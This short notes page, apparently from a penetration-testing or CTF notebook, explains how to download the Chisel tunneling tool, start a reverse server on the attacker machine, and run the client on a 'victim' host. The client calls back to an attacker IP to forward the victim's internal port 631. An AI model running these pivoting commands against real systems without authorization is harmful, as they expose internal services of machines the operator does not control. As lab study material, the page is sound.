---
title: Chisel 🦦
---
## Download

- Go to the [Official repository](https://github.com/jpillora/chisel) 
- Select a release, clone it and unzip it:

```shell
wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz
gunzip chisel_1.10.1_linux_amd64.gz
# Now create a python server and upload it to the machine
```

## Usage

### On your machine

```shell
./chisel_1.10.1_linux_amd64 server -p 7000 --reverse 
```

### On victim's machine

```shell
chmod +x chisel_1.10.1_linux_amd64
./chisel_1.10.1_linux_amd64 client 10.10.14.25:7000 R:7631:localhost:631
```

>[!Note]
>You can change port (in my case 7000) to anyone.

Now you should be able to load that machine's port on your browser or make curl requests to it.